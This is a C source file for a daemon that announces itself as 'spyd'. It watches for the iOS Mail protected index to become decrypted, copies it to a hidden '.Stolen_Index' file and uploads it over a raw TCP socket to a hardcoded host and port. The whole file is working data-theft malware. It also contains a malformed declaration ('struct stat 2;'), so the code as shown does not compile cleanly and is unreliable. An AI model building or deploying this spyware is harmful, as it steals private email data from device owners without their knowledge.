#define MAC_OS_X_VERSION_MIN_REQUIRED MAC_OS_X_VERSION_10_5
#define HOST "192.168.1.100" 
#define PORT 8080
#define TARGET "/private/var/mobile/Library/Mail/Protected Index"
#define STASH "/private/var/mobile/Library/Mail/.Stolen_Index"


#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <fcntl.h> 
#include <errno.h>
#include <unistd.h> 
#include <sys/stat.h>
#include <sys/socket.h>
#include <net/if.h> 
#include <arpa/inet.h> 
#include <netinet/tcp.h>
#include <netinet/in.h>


int cp(const char *src, const char *dest) 
{
   char buf[0x800];
   int in, out, nr = 0; struct stat 2;
   printf("copying %s to %s\n", src, dest); in = open(src, O_RDONLY, 0);
   if (in < 0)
      return in;
   out = open(dest, O_WRONLY | O_CREAT, 0755);
   if (out < 0)
   {
      close(in);
      return out; 
   }
   do
   {
      nr = read(in, buf, 0x800); 
      if (nr > 0) 
      {
         nr = write(out, buf, nr); 
      }
   }
   while(nr > 0);
   
   
   close(in); close(out);
   if (nr < 0) 
      return nr;
   sync();
   return 0; 
}


int send_file(int wfd, const char *filename) 
{
   size_t nr, nw, bsize;
   static unsigned char *buf = NULL;
   struct stat sbuf;
   unsigned long long tb = 0; off_t off;
   int fd, r;
   printf("sending %s...\n", filename);
   fd = open(filename, O_RDONLY);
   if (fd < 0) 
   {
      printf("ERROR: unable to open %s for reading: %s\n",
             filename, strerror(errno)); 
      return fd;
   }
   r = fstat(fd, &sbuf);
   if (r) 
   {
      printf("ERROR: unable to fstat() file\n"); close(fd);
      return r;
   }
   
   bsize = sbuf.st_blksize;
   if ((buf = malloc(bsize)) == NULL) 
   {
      printf("ERROR: malloc() failed\n"); close(fd);
      return ENOMEM;
   }
   while ((nr = read(fd, buf, bsize)) > 0) 
   { 
      if (nr) 
      {
         for (off = 0; nr; nr -= nw, off += nw) 
         {
            if ((nw = send(wfd, buf + off, (size_t)nr, 0)) < 0) 
            {
               printf("ERROR: send() to socket failed"); free(buf);
               close(fd); return nw;
            }
            else 
            {
               tb += nw; 
            }
         } 
      }
   }
   printf("sent %llu bytes\n", tb);
   free(buf);
   close(fd);
   return 0;
}


int upload_file(const char *filename)
{
   struct sockaddr_in addr;
   int yes = 1;
   int addr_len;
   int wfd; int r;
   wfd = socket(AF_INET, SOCK_STREAM, 0);
   memset(&addr, 0, sizeof(struct sockaddr_in)); 
   addr.sin_family = AF_INET;
   addr.sin_addr.s_addr = inet_addr(HOST);
   addr.sin_port = htons(PORT);
   addr_len = sizeof(struct sockaddr_in);
   
   printf("connecting to %s:%d...\n", HOST, PORT);
   r = connect(wfd, (struct sockaddr *)&addr, addr_len);
   if (r < 0)
   { 
      close(wfd);
      return r; 
   }
   setsockopt(wfd, SOL_SOCKET, TCP_NODELAY, &yes, sizeof(int)); printf("sending file to socket...\n");
   r = send_file(wfd, filename);
   close(wfd);
   return r; 
}



int main(int argc, char* argv[]) 
{
   char buf[128];
   int fd, nr, i, enc; struct stat s;
   printf("spyd compiled " __DATE__ " " __TIME__ "\n");
   while(1) 
   {
      if (!stat(STASH, &s)) 
      {
         printf("sending existing stash...\n"); 
         i = upload_file(STASH);
         if (!i) 
            break;
      }
      fd = open(TARGET, O_RDONLY); 
      if (fd) 
      {
         printf("testing target file...\n"); 
         nr = read(fd, buf, sizeof(buf));
         close(fd);
         if (nr == 128) 
         {
            enc = 1;
            for(i=0;i<128;++i) 
            {
               if (buf[i]!=0)
                  enc = 0; 
            }
            if (!enc)
            {
               printf("file is decrypted! going after it...\n"); i = cp(TARGET, STASH);
               if (i) 
               {
                  printf("ERROR: couldn't copy file: %s", strerror(errno)); 
               } 
               else 
               {
                  i = upload_file(STASH); 
                  if (!i)
                     break; 
               }
            } 
         }
      }
      sleep(30); 
   }
   unlink(STASH);
   return 0; 
}
